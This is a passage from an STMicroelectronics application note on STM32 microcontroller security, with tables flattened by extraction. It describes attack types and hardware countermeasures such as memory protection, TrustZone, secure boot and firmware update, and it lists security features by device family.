library. In addition, selected data may need enhanced protection if they are considered as valuable assets
(cryptographic keys).
The internal memory content must be protected against external accesses (such as communication interfaces)
and internal accesses (other software processes). The memory attributes and the firewall are the main protections
for process and data isolation.

•
•

Risks: sensitive firmware copy or data theft
Countermeasures:

–
–
–
–
–

execute-only access right (XO)
firewall
memory protection unit
secure area
encryption of external memory

AN5156 - Rev 10

page 14/59

AN5156
Attack types

SRAM

The SRAM is the device running memory. It embeds runtime buffers and variables (such as stack or heap) and
can embed firmware and keys. While in the non-volatile memory, the secrets may be stored as encrypted, when
loaded to the SRAM, they need to be present in plain view to be used. In the same time, the SRAM usually holds
communication buffers. For these two reasons, an attacker may be tempted to focus his effort on the SRAM. At
least three types of attack can be raised against this memory: code (malware) injection, memory corruption
through buffer overflow and retrieval of secrets through temporary stored variables.

•
•

Risks: buffer overflow, data theft or device control
Countermeasures:

–
–
–

firewall
memory protection unit
Secure area

Random number generation

Random numbers are often used in cryptography for session key, cryptographic nonce or initialization vector (IV)
generation. Weak random generator may make any secure protocol vulnerable.
A software attack tries to exploit an hidden periodicity or structures of a random sequence to guess the secret key
and break into communication confidentiality. An hardware attack attempts to disable the entropy source, or
weaken the statistic randomness of the output.
A robust random generator depends on both the quality of the entropy source (analog) and the subsequent
processing in digital.

•
•

Risk: reduced security of cryptographic protocols
Countermeasure:

–
–
–

Use true hardware entropy generator.
Use tests on the RNG output, and verify statistic properties of produced random numbers.
Take full advantage of the error detection and heath check mechanisms available on the device RNG.

Communication stack

Connectivity protocols (such as Bluetooth, Ethernet, Wi-Fi or LoRa) have complex communication firmware
stacks. These stacks, often available in open source, must not always be considered as trusted. A potential
weakness can be massively exploited.

•
•

Risk: device access (content, control) through network
Countermeasures:

–
–
–

communication process isolation
server authentication
secure firmware update to patch bugs

Communication eavesdrop

Data exchanges between a device and an IoT service can be eavesdropped, either directly by a compatible RF
device or through the network. An hacker may seek for retrieving data, getting device IDs or accessing services.
Cryptography can be adopted by all communication protocols. Several encryption steps are often considered to
protect the communication between all the different layers (device, gateway, applications).

•
•

Risk: observation and spoofing of network traffic
Countermeasure: use of cryptographic version of the communication stack (like TLS for Ethernet)

AN5156 - Rev 10

page 15/59

AN5156
Device protections

4

Device protections

4.1

Note:

4.2

Security protections described in this section are controlled by hardware mechanisms. They are set either
by configuring the device through option bytes, or dynamically by hardware component settings:

•

•
•
•

Memory protection: main security feature, used to protect code and data from internal (software) and
external attacks
Software isolation: inter-processes protection to avoid internal attacks
Interface protection: used to protect device entry points like serial or debug ports
System monitoring: detects device external tampering attempts or abnormal behaviors

Configuration protection
Any persistent security configuration is stored in a dedicated area of the non-volatile memory, called option bytes
(OB). The option bytes are protected with redundancy, and, in case of perceived vulnerability, they are stored as a
“magic value”. Besides rules imposed by security logic (OB can only be changed under specific conditions), there
are rules to determine the default value in case of OB corruption.

Magic value is a pattern of usually 8 bits that must be exactly matched for the value to be recognized as valid,
common examples are 0xB4 or 0xC3 for TRUE or FALSE.
Details about rules to modify the option bytes are detailed in each reference manual. The configuration is
generally frozen by raising the RDP level. Additional rules apply case-by-case.
Each OB value is preconfigured to a reset value in production. This value is usually the least secure, open option.
In case of an error detected in OB loading (OBL, happens on every POR or request), the configuration is set to a
default value. This default value usually sets the highest possible security level to prevent leaking information
from damaged microcontroller.
It is useful to analyze the impact of a configuration error on an application, and to plan for potential recovery.
Highest number of corrupted option bytes however result of errors in programming. If the OB are modified in
controlled environment, the threat of unintentional device locked-up is very low.

TrustZone® for Armv8-M architecture
Microcontrollers based on Armv6 or Armv7 architecture (Cortex-M0, M3, M4, and M7) rely mostly on software
implementations for firmware and resource isolation. These mechanisms, described later in the document, are
robust but not that flexible to allow the concurrent execution of secure firmware together with nonsecure firmware.
The Armv8-M architecture brings a new security paradigm in Arm microcontrollers. It implements the TrustZone®
technology at microcontroller system level, allowing the development of trusted firmware through a robust
isolation at runtime.
The TrustZone® technology relies on a processor (Cortex-M23 or Cortex-M33) separation for secure and
nonsecure domains and on a bus infrastructure (AMBA®) propagating secure attribute throughout the whole
system (peripherals and memories).
The TrustZone is made for robust and flexible security control at runtime. Switching from secure to nonsecure
domain and vice versa is straightforward with few cycle penalties. There is no need for a Secure monitor as in
TrustZone® for application processors Cortex‑A.

AN5156 - Rev 10

page 16/59

Secure modes are orthogonal to the existing modes, Thread and Handler. Thus, there can be a Thread or
Handler mode in each secure mode (see the figure below).

AN5156
Device protections

Figure 3. Armv8-M TrustZone® execution modes

Armv6-M/Armv7-M

Arm TrustZone system security
Armv8-M

Secure

Nonsecure

Handler mode

Handler mode

Handler mode

Thread mode

Thread mode

Thread mode

1
V
7
8
6
3
6
T
D

On typical firmware architecture running on Armv8 TrustZone®, the nonsecure domain executes the application
and the OS tasks, while the secure domain executes the secure application and the system root-of-trust
mechanisms.

4.3

Dual-core architecture
In dual-core products, one core can act as secure while the other is nonsecure. Some products,
such as dual‑core STM32WL devices in particular, feature a hardware support to propagate the secure attribute to
memory and peripherals, ensuring that robust runtime isolation implementation is possible.
A dedicated security controller is added to the dual-core STM32WL devices to facilitate the isolation.
Instead of using attribution units, the secure NV memory dedicated to securable CPU2 is defined in the flash
memory interface configuration. Key peripherals such as the DMA must convey the secure context (refer to the
user manual Getting started with STM32CubeWL for STM32WL series (UM2643) for details about this hybrid
architecture).

Figure 4. Simplified diagram of dual-core system architecture

CPU1
nonsecure
MPU

CPU2
secure
MPU

AHB

DMA

Flash interface

Security
controller

AHB/APB bridge

Bus masters

Slaves

SRAM

1
V
8
1
3
7
6
T
D

AN5156 - Rev 10

page 17/59

AN5156
Device protections

4.4

Memory protections
Memory protections are of the highest importance when considering system security. Storage containing sensitive
code and data must not be accessible from any unexpected interface (debugging port) or an unauthorized
process (internal threat).
Depending on the asset to be protected (code or data), various mechanisms can be set to establish protections at
the source of the unauthorized access (external port, internal process) or on the memory type to be protected
(flash, SRAM, or external memory).
Part of the access filtering can be performed by the memory interfaces (like flash controller), the bus controller
peripheral (firewall), or through the core MPU if it is available. Details on proprietary protections (secure hide
protection, PCROP, WRP, RDP) can be found in Section 6: STM32 security features.
Embedded flash memory, embedded SRAM, and external memories are designed for different purposes. Their
respective protections mechanisms reflect these differences.
The figure below provides a simple view of memories access architecture in a microcontroller.

Figure 5. Memory types

System Flash
memory

System Flash
memory

r
e

l
l

o
r
t
n
o
c

h
s
a
F

l

P
T
O

Flash
user memory

Flash
user memory

Bank 1

Bank 2

SRAM

NOR/NAND flash
SDRAM

Octo-SPI or
Quad-SPI flash

C
M
F

C
E
D
F
T
O

r
o
I

P
S
-
o

t
c
O

I

P
S
-
d
a
u
Q

STM32
microcontroller

1
V
8
4
9
0
5
T
D

s
r
e
t
s
a
m
s
u
B

)

A
M
D

r
o
U
P
C
s
a

h
c
u
s
(

The table below summarizes the particularities of each type of memories and typical protection features.

Table 5. Memory types and associated protection

Memory

Types

Description

Protections

System flash
memory

User flash memory

. Internal

. NVM

. ROM

. Internal

. NVM

ROM part of the flash memory. Embeds device
bootloader and other ST services.

Cannot be updated (erase/written).

A part may also be unreadable.

Flash memory for user application

Internal protections:

•
•

RDP
WRP (not for SRAM)

AN5156 - Rev 10

page 18/59

Memory

Types

Description

Protections

AN5156
Device protections

SRAM

. Internal

. Volatile

Working memory for Stack, heap or buffers.
Can be used to execute the firmware
downloaded from internal or external non-
volatile memories.

NAND, NOR, Octo-
or Quad-SPI flash
memory

. External

. NVM

SDRAM

. External

. Volatile

Additional memory for applications or data
storage

Additional RAM for application execution

Cryptography

•
•
•
•
•
•

TrustZone
PCROP (not for SRAM)
OTP (not in SRAM)
Firewall
Secure hide protection (not for SRAM)
MPU

Cryptography

Write protection (on Flash device)

TrustZone

4.4.1

System flash memory
In STM32 MCUs, the system memory is a read-only part (ROM) of the embedded flash memory. It is dedicated to
the ST bootloader. Some devices include additional secure services (RSS) in this area. This part cannot be
modified to guarantee its authenticity and integrity. The bootloader is readable since it does not contain any
sensitive algorithm. Some parts of the RSS are hidden and cannot be read by the user.
The protection attribute on the system flash memory cannot be modified.

4.4.2

User flash memory
This is the main user memory, used to store firmware and non-volatile data. It is part of the embedded flash
memory, and can be protected by a set of memory protection features available on all STM32 MCUs.

External attacks

The embedded flash memory is easy to protect against external attacks, unlike external flash memories. Disabling
the debugging port access with RDP and the controlled access of connectivity interface provide sufficient isolation
from outside.
Associated protection: RDP to disable debug access

Internal attacks

An internal read or write access to the memory can come from a malware injected either in the device SRAM or
inside an untrusted library, so that the critical code and data must only be accessible by authorized processes.
Associated protections: PCROP, MPU, firewall, secure hide protection, or TrustZone

Protecting unused memory

Write protection must always be set by default on the flash memory, even on unused area, to prevent either code
modification or injection. A good practice is to fill unused memory with known values such as software interrupt
(SWI) op-codes, illegal op-codes, or NOPs.
Associated protections: MPU or WRP

Error code correction (ECC)

The flash memory sometimes feature ECC that allows error detection and correction (up to 2-bit error detection
and 1-bit error correction). More considered as a safety feature, it also works as a complementary protection
against fault injection.

4.4.3

Embedded SRAM
The embedded SRAM is the device working memory. It is used for stack, heap, global buffers, and variables at
runtime. The SRAM can be accessed as bytes, half-words (16 bits), or full words (32 bits), at maximum system
clock frequency without wait state.

AN5156 - Rev 10

page 19/59

AN5156
Device protections

Code execution

The part of the firmware that requires faster performances can be downloaded from the user or the external flash
memory, and executed from the SRAM. Another reason to execute code from the SRAM is when using encrypted
external flash memory on devices without on-the-fly decryption: the code is decrypted inside the SRAM before its
execution. Appropriate memory protections must then be enabled on the SRAM address range containing the
code. When no code must be executed in the SRAM, it is advised to prevent any malware execution by setting
the appropriate attribute (execute never) with the MPU.
Associated protections: MPU or firewall

SRAM cleaning

The SRAM can contain sensitive data or temporary values allowing some secrets retrieving. A typical example is
the transfer of a secret cryptographic key from protected flash memory area in clear text, inside the SRAM. It is
highly recommended to clean explicitly the working buffers and variables immediately after the processing of
functions manipulating sensitive data.

Note:

In case of reset, the STM32 MCUs allow the automatic erase of the SRAM (refer to the reference manual). For
some devices, part of the SRAM is protected against external access or untrusted boot (SRAM boot) when the
RDP is set.

Write protection

The write protection can be used to isolate part of the area from being corrupted by another process or
by preventing an overflow attack. An overflow attack consists in writing more data than the targeted buffer size
(during a data transfer through interface ports for example). If no boundary checks are performed, the memory
address above the buffer is corrupted, and a malware can be injected this way. This protection is only featured by
the SRAM regions, which are used primarily for code execution (this protection is not practical for data).
The SRAM write protection is available for SRAM2 region on some STM32 MCUs only
(refer to Section 6.1: Overview of security features and to the reference manual).
Associated protections: MPU, TrustZone, or SRAM write protection (available on some STM32 devices only)

Parity check and ECC

The parity check on the SRAM allows the control of potential errors word-by-word (32 bits). One extra bit per byte
is added to the memory content (data bus width is 36 bits) to increase its robustness, as required for instance by
Class B or SIL norms. ECC is more sophisticated, with SECDED functionality, but only available for SRAM on
certain MCU devices. Integrity protections based on redundancy often cannot be disabled.

External flash memories
The external flash memories are connected to the microcontroller through dedicated interfaces (NAND, NOR,
Octo-SPI, or Quad-SPI). As the embedded flash memory, the external ones contain code and data, but the
external storage raises the problem of confidentiality (content protection) and authentication (device protection).
The hardware protection is limited to a write lock, to avoid content erasing or modification. Further protection is
brought by cryptography algorithms. The content must be at least signed to avoid execution of unauthenticated
firmware. Encryption is required only if the content is confidential.
The embedded code can be either executed in-place or loaded into the SRAM before execution. Execution in-
place of encrypted firmware is possible only if the device has on-the-fly decryption capabilities. In the other case,
the firmware must be decrypted when loaded into SRAM. If the decrypted code or parts of it are not protected
from readout (RDP2), then the confidentiality of the code is violated. It is also recommended to combine
encryption with integrity protection.
Associated protection: OTFDEC

4.4.4

AN5156 - Rev 10

page 20/59

4.4.5

STM32 memory protections
Several STM32 features are available to cover the various cases considered. They are listed in the table below
with their respective scope, and described in Section 6: STM32 security features.

AN5156
Device protections

4.5

Table 6. Scope of STM32 embedded memory protection features

Feature

External attack
protection

Internal attack
protection

Flash memory

SRAM

RDP

Firewall

MPU

PCROP(1)

WRP(2)

HDP

TrustZone®

Yes

No

No

Yes

Yes

Yes

Yes

No

Yes

Yes

Yes (read/write)

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

No

No

Yes (for execution)(3)

Yes

1. Support of this feature in Armv6-M products is limited as constant data cannot be stored in NVM.

2. Write protection can be unset when RDP level ≠ 2.

3. The SRAM is protected by a secure area only at secure code execution. It must be cleaned before leaving the secure area.

Software isolation
The software isolation refers to a runtime mechanism protecting different processes from each other (interprocess
protection). These processes can be executed sequentially or concurrently (for example tasks of operating
system). The software isolation in the SRAM ensures that respective stack and working data of each process
cannot be accessed by the other processes. This interprocess protection can be extended to the code in the flash
memory and nonvolatile data as well.
Goals of the software isolation:

•
•

Prevent a process to spy the execution of another sensitive process.
Protect a process execution against a stack corruption due to memory leaks or overflow (incorrect memory
management implementation).

This memory protection can be achieved through different mechanisms listed in the table below, and detailed
in Section 6: STM32 security features .

Table 7. Software isolation mechanism

Protection

Type

Isolation

MPU

Firewall

Secure hide protection

Dual core

Dynamic

By privilege attribute (1)

Static

Static

Static

By bus address hardware control

Process preemption at reset

By core ID(2)

TrustZone®/Security attribute

Static and dynamic

By secure attribute propagated from the core to all resources

1. The attribute protection is only for CPU access and is not taken into account for other bus master (such as DMA).

2. Reading the CPUID indicates which CPU is currently executing code. An example can be found in the

HAL_GetCurrentCPUID function.

4.6

Debug port and other interface protection
The debug ports provide access to the internal resources (core, memories, and registers) and must be disabled
in the final device. It is the most basic external attack that is easily avoided by deactivating JTAG (or SWD) ports
by a secure and immutable firmware (refer to Section 5.3.1: Secure boot (SB) ), or preferably by permanently
disabling the functionality (JTAG fuse in RDP2).

AN5156 - Rev 10

page 21/59

4.7

4.8

AN5156
Device protections

Other serial interfaces can also be used. If the bootloader is available, the device content can be accessed
through I2C, SPI, USART, or USB‑DFU. If the interface is open during the runtime, the application transfer
protocol must limit its access capabilities (such as operation mode or address access range).
Associated STM32 features:

•
•
•

read protection (RDP)
disable of unused ports
bootloader access forbidden (configured by RDP in STM32 devices)

Boot protection
The boot protection secures the very first software instructions in a system. If an attacker succeeds in modifying
the device boot address, he/she can execute his/her own code, to bypass initial dynamic protections configuration
or to access unsecured bootloader applications that give access to the device memory.
A microcontroller usually allows the boot configuration in order to choose between starting at user application,
at bootloader application, or at the SRAM located firmware. The boot protection relies on a single entry point to
a trusted code that can be the user application, or a secure service area if available (RSS).
Associated STM32 features:

•
•
•
•

read protection (RDP)
unique boot entry
secure hide protection (HDP)
TrustZone

System monitoring
The monitoring of the device power supply and environment can be set to avoid malfunction and to take
corresponding countermeasures. Some mechanisms, like tamper detection, are dedicated to security. Other
mechanisms are primarily used for safety reason but can serve security as well. For example, the detection of a
power down or external clock disconnection can be unintentional (safety) but can also reveal an attack (security).
Tamper detection is used to detect system/board level intrusions. The opening of a consumer product enclosure
can be detected on an MCU pin and trigger appropriate actions. Internal tamper sensors are capable of detecting
irregular voltage, temperature, or other parameters.
Clock security system is used to protect against external oscillator failures. If a failure is detected on the
external clock, the microcontroller switches to the internal clock in order to safely execute. The interrupt signal
allows the firmware to react to the clock failure event.
Power supply and voltage level can be monitored to detect abnormally-low voltage level. Below a certain voltage
value, the normal behavior cannot be guaranteed and it may be the sign of a fault injection attack.
Device temperature can be measured with an internal sensor. The information is feedbacked to the device
through an internal ADC channel. A monitoring application can take appropriate actions according to the
temperature range. Increased temperature may be part of a fault injection attack scheme.
Associated STM32 features:

•
•
•
•

tamper protection (with RTC component)
clock security system
power supply supervision
temperature sensor

AN5156 - Rev 10

page 22/59

AN5156
Secure applications

5

Secure applications

In order to create a secure system, the hardware features must be used in a secure firmware architecture
implementation. An industry standard solution is the PSA, proposed by Arm for the IoT ecosystem. The
STMicroelectronics proprietary solution is Secure boot (SB) and Secure firmware update (SFU). It is possible to
use Secure firmware installation (SFI) to securely provision blank devices in manufacturing.
This section defines the root and chain of trust concept before presenting the following typical secure
applications implementing the features listed below:

•
•
•
•

Secure boot
Secure firmware update
Secure storage
Cryptographic services

Note:

5.1

Note:

5.2

5.3

5.3.1

These applications have a close link with cryptography. All cryptographic schemes are based on the three
concepts of secret key, public key, and hashing. Basics of cryptography are explained in Appendix A.
Cryptography - Main concepts.

•

•

•

The document [9] provides an implementation example of SB and SFU (www.st.com/en/product/
x‑cube‑sbsfu).
The user manual 'Getting started with STM32CubeL5 TF-M application' (UM2671) describes an example
of TF-M implementation with the STM32L5 Series MCU.
The user manual 'Getting started with STM32CubeU5 TF-M application' (UM2851) describes an example
of TF-M implementation with the STM32U5 Series MCU.

Secure firmware install (SFI)
In a mass production scenario, there may be concerns to get secure binaries to the parts without exposing them
to an untrusted environment.
In the SFI scenario, the binaries are encrypted using STM32 Trusted Package Creator software tool and sent to
HSM within the production facility, to install the code in the microcontrollers.

See AN5391, AN5054, and AN4992 for more information.
SFI is supported on STM32L4, STM32L5, STM32U5, STM32H5, and STM32H7 series.

Root and chain of trust
The principle of root and chain of trust is common to many secure systems. It is obviously scalable ad libitum,
inherently efficient and also flexible.
A chain of trust is built as a set of applicative components in which the security of each component is guaranteed
by another component. The root of trust is the anchor at the beginning of the chain on which the overall security
depends.
The secure boot implementation must be the single entry point to the device, start after reset with immutable code
in secure mode. It then authenticates a subsequent functionality and executes the next part of the firmware that
enables the additional functionality required to securely attest the following chain link. For example, it configures
volatile memory protection, so that a secure storage service can use it.

STMicroelectronics proprietary SBSFU solution
Secure boot and secure firmware update are complementary security concepts. The associated model
implementation can be found in the X-CUBE-SBSFU package.

Secure boot (SB)
The SB application is executed at reset before the user application. It provides first stages of security, and is then
responsible for ensuring the global chain of trust of the system.

AN5156 - Rev 10

page 23/59

SB main functionalities:

•
•

Check the STM32 security configuration and set up runtime protections.
Assert the integrity and authenticity of the user application images that are executed (see the figure below).

AN5156
Secure applications

Figure 6. Secure boot FSM

Reset

Check device security configuration (option  bytes)

Secure boot

Set security peripheral configuration (MPU, firewall, or IWDG)

X

Compute and check the user application firmware signature

User application

1
V
0
5
9
0
5
T
D

Device security check

This part of the SB application checks if static configurations are correct, and sets the dynamic ones. Static
secure configurations are defined by option bytes (RDP, PCROP, WRP, and HDP). Dynamic protections must be
programmed (firewall, MPU, tamper detection, and IWDG).

Integrity and authenticity check

The firmware integrity is performed by hashing the application image (with MD5, SHA1, or SHA256 hash
algorithms), and comparing the digest with the expected one. This way, the application firmware is considered
error-free.
An authenticity check is added if the expected tag is encrypted with a key shared between the firmware owner
and the device. This key is stored in a protected area of the device.

Protection attributes

The SB firmware must have the following attributes to fulfill its role:

•
•
•

It must be the device-unique entry point (no bypass).
Its code must be immutable.
It must have access to sensitive data (such as certificates or application signatures).

The most sensitive SB part takes benefit from process and data isolation features, like firewall, MP, U or secure
hide protection. the implementation depends on the STM32 available features.

5.3.2

Secure firmware update (SFU)
The SFU provides a secure implementation of in-field firmware updates, enabling the download of new firmware
images to a device.
The firmware update is a sensitive operation that must protect two parties:

•

•

the device owner: the goal is to avoid loading a corrupted firmware (intentionally or not) that can damage
the device.
the application owner (OEM): needs to protect his firmware from being cloned or loaded into
an unauthorized device.

AN5156 - Rev 10

page 24/59

AN5156
Secure applications

Architecture

An SFU transfer involves two entities: the firmware owner (OEM) and the device to be updated (see the figure
below). As the communication channel is generally considered as nonsecure since it is subject to eavesdropping,
the overall security responsibility is shared between the sender (firmware owner server) and the receiver (the
device).

Figure 7. Secure server/device SFU architecture

Secure server/HSM

SFU control software

Encrypted and signed
new firmware

Communication
channel

Device STM32xx
STM32 MCU

SFU firmware

Current firmware

New firmware

1
V
1
5
9
0
5
T
D

Application

From OEM side, a secure server is maintained that is responsible for sending the encrypted (if confidentiality is
required) and signed firmware to an authenticated device.
The SFU application running on device is in charge of the following:

•
•
•

authentication and integrity checking of the loaded image before installing it
decrypting the new firmware if confidentiality is required
checking the new firmware version (anti-rollback mechanism)

5.3.3

Configurations
The ST proprietary SBSFU is very configurable. The most important configuration option is the choice to use a
single or dual image handling of application code. Each has a separate example. Single image leaves more
space for application code. Two or more images add some advanced features to the image handling.
The second most important option is the cryptographic scheme selection. There are usually the following choices:

•

•
•

ECDSA asymmetric cryptography for firmware verification with AES-CBC or AES-CTR symmetric
cryptography for firmware encryption
ECDSA asymmetric cryptography for firmware verification without firmware encryption
X509 certificate-based ECDSA asymmetric cryptography for firmware verification without firmware
encryption
AES-GCM symmetric cryptography for both firmware verification and encryption

•
For more details, see the document [9] or the document Integration guide for the X‑CUBE‑SBSFU STM32Cube
Expansion Package (AN5056).

5.4

Arm TF-M solution
Arm trusted firmware existed for chips based on Cortex-A when the secure Cortex-M33 core was introduced with
Armv8-M architecture. A more compact TF-M open source implementation of PSA standard was provided as a
reference secure firmware framework.
For STMicroelectronics MCUs that take advantage of the Armv8 architecture (such as STM32H5, STM32L5, and
STM32U5 devices), the SBSFU is replaced with the TF-M based solution.
For a documentation on TF-M itself, refer to the UM2851, and use Arm resources as well as the code comments.
For guidance on TF-M integration on the STM32L5 and STM32U5 devices, refer to the user manuals Getting
started with STM32CubeL5 TF-M application (UM2671) or Getting started with STM32CubeU5 TF-M application
(UM2851).
Refer to document [7] for a detailed comparison when migrating from X-CUBE-SBSFU package SBSFU to TF-M.

AN5156 - Rev 10

page 25/59

AN5156
Secure applications

Table 8. Basic feature differences of TrustZone-based secure software

Feature

RoT services

SBSFU for TrustZone®

TF-M

Immutable RoT

Immutable RoT + updatable RoT

Cryptographic key management

Static keys only

Key storage hierarchy with HUK root key

Secure storage

NV counter

Absent

No

Internal and external

Yes

Both alternatives are based on TF-M and MCU boot, but while SBSFU intends to replicate familiar features of X-
CUBE-SBSFU while retaining most flash memory space for user code, TF-M offers more functionality. Some of
that can be dropped to gain memory space. For the STM32H57x line, the Secure manager, a closed-source
implementation of TF-M, offers a convenient and express way to adopt certified secure solutions.

Secure manager
The goal of the Secure manager is to guide customers to a certified secure software solution. Secure manager
implements the PSA secure APIs (similar to the TF-M) and by using them, the user nonsecure application can
form a secure system with certified attack resistance.
The Secure manger application kit is distributed in the form of encrypted binary and is free to use on compatible
STM32H5 MCUs.
Secure manager can expand its secure functionality by using modules.

Product certifications
Different secure applications often require certain certifications, proving their capability to perform in a secure
manner. Independent or government agencies grant the certification status to either an MCU application or a
combination of MCUs with secure firmware after testing it against the evaluation goals.

5.5

5.6

AN5156 - Rev 10

page 26/59

AN5156
Secure applications

The certifications and evaluations related to STM32 microcontrollers include, but are not limited to:

•

•

•

PSA certified (platform security architecture), governed by Arm, focused on IoT security, MCU certification,
three levels of assessment

–
–
–
–

STM32L4 devices are certifiable up to Level 1.
STM32L5 devices with TF-M are certifiable up to Level 2.
STM32U5 and STM32H5 devices with TF-M are certifiable up to Level 3.
To achieve Arm PSA certifiable security level, refer to the user manual STM32U585 security
guidance for PSA Certified™ Level 3 with SESIP Profile (UM2852).

SESIP (security evaluation standard for IoT platforms), international methodology adopted by several major
security evaluation labs, five levels

–

Systems using SBSFU or TF-M are compliant to Level 3 with STM32L4, STM32L4+, STM32L5,
STM32H5, and STM32U5 devices.

PCI (payment card information), important security standard focusing on point of sale (POS) applications

–

Good record of successful evaluation of systems, using for example, STM32L4 devices

Note:

FIPS (Federal Information Processing Standards ) is a set of standards published by NIST, some of which (FIPS
140, SP800) are related to security or cryptography.

MCU series

STM32G0/

STM32G4

STM32L4

STM32L4+

STM32H7

STM32L5

STM32WBA

STM32U5

STM32H5

Table 9. Certifications coverage

Crypto conformance

Security system

certification

certification

Security system
certification with physical
resistance (invasive)

FIPS CAVP, SP800-90A

PSA L1

-

FIPS CAVP, SP800-90B

PSA L2, SESIP L3

Yes

PSA L3, SESIP L3 (with
TF-M)

PSA L3, SESIP L3 (with
Secure manager)

AN5156 - Rev 10

page 27/59

AN5156
STM32 security features

6

STM32 security features

This section presents all the STM32 features that can be used to meet the different security concepts presented
in previous sections, and to achieve a high level of security.

6.1

Overview of security features

6.1.1

Static and dynamic protections
A distinction can be made depending on whether protection features are static or dynamic:

•

•

Static protections refer to features that are set with option bytes. Their configuration is retained at power
off.
Static protections are RDP (or product state), PCROP, WRP, BOR, OTP, and secure hide protection (when
available).
Dynamic (or run time) protections do not retain their status at reset. They have to be configured at each
boot (for example during Secure boot (SB) ).
Dynamic protections provided by STM32 include MPU, tamper detection, and firewall.
Other dynamic protections are related to both security and safety. An abnormal environment behavior may
be accidental (safety) or intentional, in order to carry out an attack. These protections include clock and
power monitoring systems, memory integrity bits, and independent watchdog (IWDG).

6.1.2

Security features by STM32 devices
Following tables are intended for reference and the prospects of secure code porting between STM32 products.
Presence or absence of a particular feature may not be indicative of achievable security. For that reason, refer to
the available security certifications for the particular product.

Table 10. Security features for STM32C0, STM32F0/1/2/3/4, STM32G0/4 devices

Feature

STM32C0

STM32F0

STM32F1

STM32F2

STM32F3

STM32F4

STM32G0

STM32G4

Cortex core

Cortex‑M0+

Cortex‑M0

Cortex‑M3

Cortex‑M3

Cortex‑M4

Cortex‑M4

Cortex‑M0+

Cortex‑M4

RDP additional
protection

Bad OBL
recovery

Backup
registers

2 level RDP
only

Backup SRAM

Backup
registers

Backup SRAM

Backup
registers

Flash WRP

By area with
2‑Kbyte
granularity, two
areas available

SRAM WRP

No

PCROP

HDP

Firewall

MPU

OTP

UBE(3)

By area with
256‑byte
granularity, one
area per bank

Yes (securable
memory area)

No

Yes

1 Kbyte

Yes (boot lock
feature)

Internal tamper
detection

Hardware
crypto(4)

RNG

No

No

No

By sectors
(4 Kbytes)

By pages (4 K
or 8 Kbytes)

By sectors
(16 K, 64 K, or
128 Kbytes)

By sectors
(4 Kbytes)

No

No

No

No

No

No

No

No

No

No

No

No

No

No

Yes(1)

No

No

No

No

No

No

No

No

No

Yes

Yes

No

No

AES, HASH

SP800‑90‑A

No

No

No

No

Yes(2)

Yes

No

No

No

No

By sectors
(16 K, 64 K, or
128 Kbytes)

By area with
2‑Kbyte
granularity, two
areas available

No

No

Backup
registers,
CCMSRAM

By page (2 K or
4 Kbytes)

CCM SRAM,
with 1‑Kbyte
granularity

By sectors

No

No

Yes

By area with
512‑byte
granularity, two
areas available

By area with
64‑ or 128‑bit
granularity, up
to two areas

Yes (securable memory area)

No

Yes

No

Yes

512 bytes

1 Kbyte

1 Kbyte

No

No

Yes (boot lock
feature)

Yes

Yes

Yes

AES, HASH

AES

SP800‑90‑A

AN5156 - Rev 10

page 28/59

AN5156
STM32 security features

Feature

STM32C0

STM32F0

STM32F1

STM32F2

STM32F3

STM32F4

STM32G0

STM32G4

SBSFU

TF-M

KMS

e
r
a
w

t
f
o
s
e
r
u
c
e
S

No

No

No

No

No

No

No

No

No

No

No

No

No

No

No

Yes

No

Yes

No

Yes

No

No

No

No

1. Only XL density devices feature the MPU.

2. MPU is not universally supported in STM32F3 series. Refer to the product datasheet to confirm availability.

3. Unique boot entry.

4. For most devices with hardware crypto capability, there is a direct equivalent without it.

Table 11. Security features for STM32L0/1/4/4+, STM32WB, STM32WBA, STM32WB0x, STM32WL devices

Feature

STM32L0

STM32L1

STM32L4

STM32L4+

STM32WB

STM32WBA

STM32WB0x

STM32WL

Cortex core

Cortex‑M0

Cortex‑M3

Cortex‑M4

Cortex‑M4/
Cortex‑M0+

Cortex‑M33

Cortex‑M0+

RDP additional
protection

EEPROM

Backup registers, SRAM2

RDP four
levels,backup
registers,
SRAM

No

Cortex‑M4/
Cortex‑M0+

Backup
registers,
SRAM2

Flash WRP

By sectors (4 Kbytes)

By area with 2‑Kbyte granularity,
one area per bank

By area with
4‑Kbyte
granularity, two
areas available

Two areas,
defined by
page range

By area with 2‑Kbyte granularity,
two areas available

SRAM WRP

No

No

SRAM2, with 1‑Kbyte granularity

No

PCROP

By sectors

By area with 8‑byte granularity,
one area per bank

No

No

Yes

No

No

No

No

Yes

Yes

No

No

No

Yes

Yes

No

No

By area with
2‑Kbyte
granularity, up
to two areas

Yes (dedicated
to Cortex‑M0+
firmware only)

No

Yes
(Cortex‑M4)

No

Yes

No

Yes

1 Kbyte

No

No

Yes (lockable
secure and NS
address)

Yes

No

Yes

No

No

AES

AES, HASH

AES, HASH,
(some PKA)

AES, PKA

AES, HASH,
PKA

AES(3), PKA

No

Yes

No

SP800‑90‑A

SP 800‑90‑B

SP800‑90‑A

800‑90‑B

SP 800‑90‑B

Yes

No

Yes

No

Yes

No

Yes

Yes

Yes(4)

No

SRAM2, with
1‑Kbyte
granularity

By area with
1‑Kbyte
granularity, two
areas available

Yes

Yes

Yes

Yes (boot lock
feature)

Yes

Yes

No

No

Yes

Yes

No

No

No

No

Yes

No

HDP

Firewall

MPU

OTP

UBE(1)

Internal tamper
detection

Hardware
crypto(2)

RNG

SBSFU

TF-M

e
r
a
w

t
f
o
s

e
r
u
c
e
S

KMS

No

No

Yes

Yes

No

No

No

No

1. Unique boot entry.

2. For most devices with hardware crypto capability, there is a direct equivalent without it.

AN5156 - Rev 10

page 29/59

AN5156
STM32 security features

3. For STM32WB0, the AES is only available on the radio peripheral.

4. Secure boot solution separated from the usual X-CUBE-SBSFU package.

Table 12. Security features for STM32L5, STM32U0, STM32U5, STM32H503/5, STM32H7R/S, STM32H72x/73/74x/75,
STM32H7Ax/7Bx, STM32F7 devices

Feature

STM32L5

STM32U0

STM32U5

STM32
H503

STM32H5

STM32
H7R/S

STM32
H72x/73x

STM32
H74x/75x

STM32
H7Ax/7Bx

STM32F7

Cortex core

Cortex‑M3
3

Cortex‑M0
+

Cortex‑M33

Backup
registers,
SRAM2

RDP four
levels,
backup
registers,
SRAM3

Product state instead of
RDP

Cortex‑M7

Product
state
instead of
RDP,
backup
SRAM

Backup
SRAM,
backup
registers,
OTFDEC

Backup
SRAM,
backup
registers

Two areas per bank defined by page range

By sectors
(8 Kbytes)

By sectors (128 Kbytes)

Backup
SRAM,
backup
registers,
OTFDEC

By group
of 4
8‑Kbyte
